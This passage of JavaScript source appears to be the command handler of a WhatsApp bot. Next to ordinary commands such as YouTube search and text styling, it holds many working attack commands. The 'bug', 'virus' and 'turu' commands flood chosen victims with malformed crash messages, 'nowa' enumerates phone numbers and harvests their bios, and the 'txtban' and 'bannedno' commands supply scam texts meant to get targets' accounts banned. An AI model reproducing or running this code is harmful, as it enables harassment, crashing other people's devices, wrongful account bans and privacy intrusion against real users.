break

case 'startytmp3':{
if (!q) return replyy(`Example : ${prefix + command} karna su sayang`)
const vareltzyplay = require('./lib/ytdl2')
const { fetchBuffer } = require("./lib/storage2")
let yts = require("youtube-yts")
let search = await yts(q)
let anup3k = search.videos[0]
const pl= await vareltzyplay.mp3(anup3k.url)
await VxoZap.sendMessage(from,{
audio: fs.readFileSync(pl.path),
fileName: anup3k.title + '.mp3',
mimetype: 'audio/mp4', ptt: true,
contextInfo:{
externalAdReply:{
title:anup3k.title,
body: `VarelTzy 👊`,
thumbnail: await fetchBuffer(pl.meta.image),
mediaType:2,
mediaUrl:anup3k.url,
}

},
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break

case 'yts': case 'ytsearch': {
if (!q) return replyy(`Example : ${prefix + command} story wa anime`)
yts = require("yt-search")
search = await yts(q)
nyaabanaayts = 'YouTube Search\n\n Result From '+q+'\n\n'
no = 1
for (let i of search.all) {
hasilpencarian = `${nyaabanaayts}\nNo : ${no++}\n Type : ${i.type}\n Video ID : ${i.videoId}\n Title : ${i.title}\n Views : ${i.views}\n Duration : ${i.timestamp}\n Uploaded : ${i.ago}\n Url : ${i.url}\n\n─────────────────\n\n`
}
VxoZap.sendMessage(from, { image: { url: search.all[0].thumbnail },  caption: hasilpencarian }, { quoted: m })
}
break

case 'style': case 'styletext': {
let { styletext } = require('./lib/scraper')
if (!q) return m.reply('Enter Query text!')
let anu = await styletext(q)
let teks = `Style Text From ${q}\n\n`
for (let i of anu) {
teks += `*${i.name}* : ${i.result}\n\n`
}
m.reply(teks)
}
break

case 'fliptext': {
if (args.length < 1) return replyy(`Example:\n${prefix}fliptext vareltzy`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replyy(`\`\`\`「 FLIP TEXT 」\`\`\`\n*𖤍> Normal :*\n${quere}\n*𖤍> Flip :*\n${flipe}`)
}
break

case 'setppbot': case 'setbotpp': {
if (!isDev) return replyy(global.nocreator)
if (!quoted) return replyy(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replyy(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replyy(`Send/Reply Image With Caption ${prefix + command}`)
var medis = await VxoZap.downloadAndSaveMediaMessage(quoted)
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await VxoZap.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replyy(`Success`)
} else {
var memeg = await VxoZap.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replyy(`Success`)
}
}
break

case 'tiktokgirl':
replyy('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/tiktokgirl.json'))
hasil = pickRandom(asupan)
VxoZap.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktokghea':
replyy('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/gheayubi.json'))
hasil = pickRandom(asupan)
VxoZap.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break
case 'join': {
if (!isDev) return replyy(`Khusus Varel`)
if (!q) return replyy('Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Link Invalid!'
replyy(global.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await VxoZap.groupAcceptInvite(result).then((res) => replyy(jsonformat(res))).catch((err) => replyy(jsonformat(err)))
}
break
case 'tiktoknukhty':
replyy('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/ukhty.json'))
hasil = pickRandom(asupan)
VxoZap.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktoksantuy':
replyy('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/santuy.json'))
hasil = pickRandom(asupan)
VxoZap.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktokkayes':
replyy('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/kayes.json'))
hasil = pickRandom(asupan)
VxoZap.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktokpanrika':
replyy('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/panrika.json'))
hasil = pickRandom(asupan)
VxoZap.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktoknotnot':
replyy('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/notnot.json'))
hasil = pickRandom(asupan)
VxoZap.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'nowa': {
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`insert Number, example: ${prefix+command} 62853388888xxx`)
var noteks = args[0]
if (!noteks.includes('x')) return replyy('Enter the suffix x to find the number?')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')]: ''
var random_length = countInstances(noteks, 'x')
if (random_length > 4) {
  return replyy('Maaf, hanya bisa mencari nomor dengan maksimal 4 x')
}
var random;
replyy('Loading')
if (random_length == 1) {
  random = 10
} else if (random_length == 2) {
  random = 100
} else if (random_length == 3) {
  random = 1000
} else if (random_length == 4) {
  random = 10000
}
var nomerny = `Have a bio\n`
var no_bio = `\nWithout Bio / Default bio.\n`
var no_watsap = `\nNot registered on whatsapp\n`
var data = {}
for (let i = 0; i < random; i++) {
  var nu = ['1','2','3','4','5','6','7','8','9']
  var t1 = nu[Math.floor(Math.random() * nu.length)]
  var t2 = nu[Math.floor(Math.random() * nu.length)]
  var t3 = nu[Math.floor(Math.random() * nu.length)]
  var t4 = nu[Math.floor(Math.random() * nu.length)]
  var rndm;
  if (random_length == 1) {
    rndm = `${t1}`
  } else if (random_length == 2) {
    rndm = `${t1}${t2}`
  } else if (random_length == 3) {
    rndm = `${t1}${t2}${t3}`
  } else if (random_length == 4) {
    rndm = `${t1}${t2}${t3}${t4}`
  }
  var anu = await VxoZap.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
  var anuu = anu.length !== 0 ? anu: false
  try {
    try {
      var anu1 = await VxoZap.fetchStatus(anu[0].jid)
    } catch {
      var anu1 = '401'
    }
    if (anu1 == '401' || anu1.status.length == 0) {
      no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
    } else {
      const year = moment(anu1.setAt).tz('Asia/Jakarta').format('YYYY');
      if (!(year in data)) {
        data[year] = [];
      }
      data[year].push(`wa.me/${anu[0].jid.split("@")[0]}\nBio : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`);
    }
  } catch {
    no_watsap += `${nomer0}${i}${nomer1}\n`
  }
}
const bio = Object.keys(data)
.map((key) => {
  return `*[ ${key} ]*\n${data[key].join('')}`
})
.join('\n')
const hasil = `Results of\n${noteks}:\n\n${nomerny}${bio}${no_bio}${no_watsap}\n\n.`
replyy(hasil)
}
break

case 'ping': case 'botstatus': case 'statusbot': {
				const used = process.memoryUsage()
				const cpus = os.cpus().map(cpu => {
					cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
					return cpu
				})
				const cpu = cpus.reduce((last, cpu, _, { length }) => {
					last.total += cpu.total
					last.speed += cpu.speed / length
					last.times.user += cpu.times.user
					last.times.nice += cpu.times.nice
					last.times.sys += cpu.times.sys
					last.times.idle += cpu.times.idle
					last.times.irq += cpu.times.irq
					return last
				}, {
					speed: 0,
					total: 0,
					times: {
						user: 0,
						nice: 0,
						sys: 0,
						idle: 0,
						irq: 0
					}
				})
				let timestamp = speed()
				let latensi = speed() - timestamp
				neww = performance.now()
				oldd = performance.now()
				respon = `Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}\n\n\n${cpus[0] ? `_Total CPU Usage_\n${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}\n_CPU Core(s) Usage (${cpus.length} Core CPU)_\n${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}`.trim()
				replyy(respon)
			}
			break
case 'bugcrashv2': 
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy('Insert Id Group')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@g.us"
jumlah = 20
sendVariousMessages(Pe, jumlah)
await sleep(2000)
replyy(`*Successfully sending bug to ${Pe} Please pause for 3 minutes*`)
break
case "virusv1": case "virusv2": case "virusv3": case "virusv4": {

if (!isCreator) return replyy('_</> owner only..._')
  if (!text) return replyy(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replyy(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replyy("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await VxoZap.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285655649546") {
    return replyy(`OWNER KU JAN DI BUG TOLOL`)
  }
  if (contactInfo.length == 0) {
    return replyy("The number is not registered on WhatsApp");
  }
  let buttonggggg = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${cleanedNumber}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${cleanedNumber}`,
      merchant_url: `https://wa.me/${cleanedNumber}`
   })
}], m, {
   body: buttonggggg,
   footer: 'Powered By VarelTzy'
})
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "<✓> Successfully Send Bug to @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.\n\n© VarelTzy Not Sepuuh", 
    [whatsappNumber]
  );
}
break;
case 'turuv4': case 'turuv3': case 'turuv2': case 'turuv1': {

if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return replyy(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
let buttongggggg = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${bijipler}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${bijipler}`,
      merchant_url: `https://wa.me/${bijipler}`
   })
}], m, {
   body: buttongggggg,
   footer: 'Powered By VarelTzy'
})
for (let j = 0; j < 5; j++) {
await ngeloc(target, force)
await pirgam(target, bugquoteddvc)
await bakdok(target, force)
await penghitaman(target, force)
await sendSystemCrashMessage(target)
await sendBugIos(target)
await ngeloc(target, force)
await sendListMessage(target)
await bakdok(target, force)
await penghitaman(target, force)
await sendSystemCrashMessage(target)
await sendBugIos(target)
await sendExtendedTextMessage(target)
VxoZap.sendMessage(target, {text: `*Turu Ga?*`}, {quoted: force})
await sleep(2000)
await ngeloc(target, force)
await pirgam(target, bugquoteddvc)
await bakdok(target, force)
await penghitaman(target, force)
await sendSystemCrashMessage(target)
await sendBugIos(target)
await ngeloc(target, force)
await sendListMessage(target)
await bakdok(target, force)
await penghitaman(target, force)
await sendSystemCrashMessage(target)
await sendBugIos(target)
await sendExtendedTextMessage(target)
VxoZap.sendMessage(target, {text: `*Turu?*`}, {quoted: force})
await sleep(2000)
await ngeloc(target, force)
await pirgam(target, bugquoteddvc)
await bakdok(target, force)
await penghitaman(target, force)
await sendSystemCrashMessage(target)
await sendBugIos(target)
await ngeloc(target, force)
await sendListMessage(target)
await bakdok(target, force)
await penghitaman(target, force)
await sendSystemCrashMessage(target)
await sendBugIos(target)
await sendExtendedTextMessage(target)
VxoZap.sendMessage(target, {text: `*Bang?*`}, {quoted: force})
await sleep(2000)
}
await replyy(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'bugcrash': case 'bug-bunga': {
if (!isCreator) return replyy(`ANJ SIAPA LU`)
if (!q) return replyy(`Penggunaan .${command} 628xxx`)
let rapperrru = q.replace(/[^0-9]/g, "")
if (rapperrru.startsWith('0')) return replyy(`𖤍 Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = rapperrru + '@s.whatsapp.net'
let buttonggggggg = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${rapperrru}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${rapperrru}`,
      merchant_url: `https://wa.me/${rapperrru}`
   })
}], m, {
   body: buttonggggggg,
   footer: 'Powered By VarelTzy'
})
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
VxoZap.sendMessage(Pe, {text: `*Flower 🌷*`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
VxoZap.sendMessage(Pe, {text: `*Flower 🌷*`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
VxoZap.sendMessage(Pe, {text: `*Flower 🌷*`}, {quoted: force})
await sleep(2000)
}
replyy(`</> Successfully submitted the bug *${command}*`)
}
break
case 'hallo-bang': 
if (!isDev) return replyy(global.nocreator)
jumlah = 20
sendRepeatedMessages2(from, jumlah)
sendVariousMessages(from, jumlah)
await sendViewOnceMessages(from, jumlah)
await sleep(2000)
replyy(`𝐁𝐔𝐆 𝐁𝐘 𝐁𝐎𝐓 𝐕𝐑𝐋 𝟕,𝟓`)
break

case 'ytmp3': case 'youtubemp3': {
if (!isCreator) return replyy('*.*')
if (!q) return replyy(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%2`)
await loading()
downloadMp3(q)
}
break

case 'cek?': {
replyy('Bot Ready to Use 🤗')
}
break

case 'bugvid1':
if (!isCreator) return replyy('*.*')
bugvid1 = fs.readFileSync('./lib/video/bug1.mp4')
VxoZap.sendMessage(from, {video: bugvid1},{quoted: vareltzybugnew})
break

case 'bugvid2':
if (!isCreator) return replyy('*.*')
bugvid1 = fs.readFileSync('./lib/video/bug2.mp4')
VxoZap.sendMessage(from, {video: bugvid1},{quoted: vareltzybugnew})
break

case 'paptt':
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Example ${prefix + command} foto/video`)
papttfoto = JSON.parse(fs.readFileSync('./lib/paptt-foto.json'))
papttvideo = JSON.parse(fs.readFileSync('./lib/paptt-video.json'))
titid1 = (pickRandom(papttfoto))
titid2 = (pickRandom(papttvideo))
if (q == 'foto') {
replyy("Photos will be sent via private chat ( *PC* )")
VxoZap.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan🥵'}, { quoted: m })
} else if (q == 'video') {
replyy("Video will be sent via private chat ( *PC* )")
VxoZap.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Mana Tahan🥵'}, { quoted: m })
}
break

case 'tourl': {
if (!isCreator) return replyy(global.nocreator)
if (!quoted) return replyy(`Reply Media`)
replyy('*please wait a moment*')
let media = await VxoZap.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
anuh = await TelegraPh(media)
replyy(util.format(anuh))
} else if (/video/.test(mime)) {
anuh = await TelegraPh(media)
replyy(util.format(anuh))
} else if (!/image/.test(mime)) {
anuh = await UploadFileUgu(media)
replyy(util.format(anuh))
}
await fs.unlinkSync(media)       
}
break

case 'txtban1':
if (!isCreator) return replyy(global.nocreator)
replyy(`Hola😁, ¿necesitas dinero? Ofrezco un sitio de apuestas en línea con premios en metálico de $700 y condiciones simples. Puedes hacer un depósito mínimo de $70 y puedes duplicar tu dinero.
💰 Realice un depósito inmediatamente en mi sitio de apuestas en línea y obtenga la mayor cantidad de dinero posible. registrarse en mi sitio de apuestas en línea a través de
Enlace : https://registrarse.en.el.sitio.de.apuestas/
Correo electrónico : support@support.whatsapp.com
Whatsapp : https://api.whatsapp.com/send?phone=`)
break

case 'txtban2':
if (!isCreator) return replyy(global.nocreator)
replyy(`Hola, ¿Necesitas un trabajo para ganar dinero? Quiero ofrecerte un trabajo muy fácil y podrás duplicar todo tu dinero. Te ofrezco un trabajo, concretamente ser administrador de un sitio de juegos de azar online con un premio de 900$ y un depósito mínimo de 70$. Si estás interesado en aceptar una oferta de trabajo mía, puedes comunicarte al número de soporte 👇
https://api.whatsapp.com/send?phone=
💰 También puedes participar en este juego de apuestas en línea registrándote en nuestro sitio y realizando un depósito mínimo de 70$. Vamos, deposita inmediatamente para duplicar tu dinero 💸. Regístrese en nuestro sitio de apuestas en línea y el enlace de registro está disponible a continuación 👇
https://registrarse.en.el.sitio.de.apuestas/
*support@support.whatsapp.com*`)
break

case 'txtban3':
if (!isCreator) return replyy(global.nocreator)
replyy(`🎲 ONLINE-WETSEITE 🎲
Hallo, ich komme von einem Online-Glücksspielseitenunternehmen namens vareltzy888. Ich bin hier, um Ihnen anzubieten, Ihr Geld sofort zu verdoppeln. Sie können es verdoppeln, indem Sie auf der Wettseite vareltzy888 einen Nominalwert von 80 $ und einen Preis von 900 $ einzahlen. Bitte registrieren Sie sich über den Link 👇 auf der Online-Glücksspielseite vareltzy888
🎮 Wettseiten: https://register.vareltzy888.bet/
Alternative zur Registrierung 👇
🎮 Facebook : vareltzy888
🎮 Whatsapp : https://api.whatsapp.com/send?phone=+6289630514341
Bitte registrieren Sie sich, um Ihr Geld zu verdoppeln 🤤`)
break

case 'bugsystem':
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy('Insert target number')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 20
sendRepeatedMessages2(Pe, jumlah)
await sleep(2000)
replyy(`*Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes 🤗`)
break

case 'sv-varel':
if (!isDev) return replyy(global.nocreator)
jumlah = 20
khususbugspam(from, jumlah)
await sleep(2000)
khususbugspam(from, jumlah)
await sleep(2000)
khususbugspam(from, jumlah)
await sleep(2000)
replyy(`𝐓𝐀𝐑𝐆𝐄𝐓 𝐃𝐎𝐖𝐍 💀\n© ${global.namaowner}`)
break

case 'izinbug':
if (!isDev) return replyy(global.nocreator)
jumlah = 20
khususbugspam(from, jumlah)
await sleep(2000)
replyy(`𝐓𝐀𝐑𝐆𝐄𝐓 𝐃𝐎𝐖𝐍 💀\n© ${global.namaowner}`)
break

case 'bannedno':
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(' Enter the target number Prefix "+" and Country Code')
await VxoZap.sendMessage(from, {text: `اربح المال بسهولة عبر الإنترنت لمدة ساعة واحدة بسعر 10 آلاف💰.\nفقط في هذا الاستبيان، قم بتسجيل حسابك على الفور، ما عليك سوى رقم واتساب جاهز للاتصال بالإنترنت 🤑.\nلا تفوت هذه الفرصة، سجل الآن باستخدام رمز QR 📄\n\nقم بالرد بـ "1" وانقر على الرابط أدناه 👇\nhttps://server.go-share.top/\n\nوتواصل مع WhatsApp الخاص بي إذا كنت ترغب في الحصول على مكافأة!!🎁\nhttps://api.whatsapp.com/send?phone=${q}`},{quoted: m})
sleep(2000)
replyy(`👆  text above then check target number 👆\n\n\n ⚠️ Warning: not all numbers can be banned`)
break

case 'xreactpc': {
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy('Insert target number')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
let mot = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${Pe}}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${Pe}`,
      merchant_url: `https://wa.me/${Pe}`
   })
}], m, {
   body: mot,
   footer: 'Powered By VarelTzy'
})
await VxoZap.sendMessage(Pe, { text: 'vareltzy Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `vareltzyReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
await VxoZap.sendMessage(Pe, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break

case 'xreactgc': {
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy('Insert Id Grup')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@g.us"
await VxoZap.sendMessage(Pe, { text: 'vareltzy Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `vareltzyReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
await VxoZap.sendMessage(Pe, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break

case 'bugiospc': {
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Example:\n ${prefix + command} 62xxxxxxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
let pspt = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${Pe}}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${Pe}`,
      merchant_url: `https://wa.me/${Pe}`
   })
}], m, {
   body: pspt,
   footer: 'Powered By VarelTzy'
})
for (let i = 0; i < amount; i++) {
await VxoZap.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
replyy(`Successfully submitted bug number ${Pe}`)
}
break

case 'bugiosgc': {
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Example:\n ${prefix + command} 1937xxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
for (let i = 0; i < amount; i++) {
await VxoZap.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
replyy(`Successfully submitted bug number ${Pe}`)
}
break

case 'bugaudiopc': {
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Example:\n ${prefix + command} 62xxxxxxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
vareltzyganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound2.mp3`)
let lot = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${Pe}}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${Pe}`,
      merchant_url: `https://wa.me/${Pe}`
   })
}], m, {
   body: lot,
   footer: 'Powered By VarelTzy'
})
for (let i = 0; i < amount; i++) {
VxoZap.sendMessage(Pe, { "caption": `VarelTzy 👊`, audio: vareltzyganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `VarelTzy`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
replyy(`Success Sending ${command} to number ${Pe}`)
}
break

case 'bugaudiogc': {
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Example:\n ${prefix + command} 1937xxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
vareltzyganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound2.mp3`)
for (let i = 0; i < amount; i++) {
VxoZap.sendMessage(Pe, { "caption": `VarelTzy 👊`, audio: vareltzyganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `VarelTzy`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
replyy(`Success Sending ${command} to group ${Pe}`)
}
break

case 'buglocpc':{
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Example:\n ${prefix + command} 62xxxxxxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
let buttonhhhhh = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${Pe}}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${Pe}`,
      merchant_url: `https://wa.me/${Pe}`
   })
}], m, {
   body: buttonhhhhh,
   footer: 'Powered By VarelTzy'
})
XeonOP = global.virtexpc
for (let i = 0; i < amount; i++) {
VxoZap.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `VarelTzy`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `VarelTzy`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
await sleep(1500)
}
replyy(`*Succes 🥰*`)
}
break

case 'buglocgc':{
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Example:\n ${prefix + command} 1937xxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
XeonOP = global.virtexpc
for (let i = 0; i < amount; i++) {
VxoZap.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `VarelTzy`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `VarelTzy`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
await sleep(1500)
}
replyy(`*Succes 🥰*`)
}
break

case '🔥': case '♥️': case '🥰': case '🤤': case '😱': case '💝': case '😭': case '😁': case '🔥': case '😡': case '😒':
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
